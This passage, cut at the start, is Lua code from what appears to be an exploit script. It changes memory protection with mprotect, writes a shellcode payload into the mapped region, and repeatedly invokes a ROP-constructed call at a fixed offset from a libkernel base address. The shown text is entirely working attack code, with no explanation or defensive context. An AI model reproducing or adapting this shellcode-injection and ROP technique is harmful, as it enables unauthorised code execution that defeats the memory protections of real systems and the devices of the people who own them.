    if syscall.mprotect(map, 0x1000, PROT_COMB):tonumber() ~= 0 then
        errorf("mprotect() error: " .. get_error_string())
    end

    for i, byte in ipairs(payload) do
        memory.write_byte(map + (i - 1), byte)
    end

    printf("shellcode written to memory.\n")
end

function c_call()
    local f = function_rop(0xfe000000)
    f(libkernel_base:tonumber(), 0x1A3E0)
end

function c_create()
    c_map()
end

function main()
    c_create()
    for i = 1, 40 do
        c_call()
    end
end

